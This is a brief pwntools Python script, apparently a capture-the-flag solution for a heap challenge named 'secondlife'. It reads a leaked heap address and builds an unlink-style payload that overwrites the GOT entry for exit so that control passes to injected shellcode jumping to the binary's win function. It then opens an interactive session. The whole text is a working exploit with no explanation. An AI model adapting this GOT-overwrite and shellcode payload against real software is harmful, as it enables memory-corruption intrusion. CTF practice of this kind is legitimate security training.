from pwn import *

path = "/problems/secondlife_3_d2e0c7e84bcd27965cec7710051e6a0b"
#elf = ELF("./vuln")
#sock = process("./vuln")
elf = ELF("{}/vuln".format(path))
sock = process("{}/vuln".format(path), cwd=path)

sock.recvline()
addr_heap = int(sock.recvline())
sock.sendline("AAAABBBBCCCCDDDD")
sock.recvline()
payload = p32(elf.got["exit"] - 0xc) + p32(addr_heap + 0x8)
payload += '\xB8' + p32(elf.symbols['win']) + '\xFF\xE0'
sock.sendline(payload)

sock.interactive()
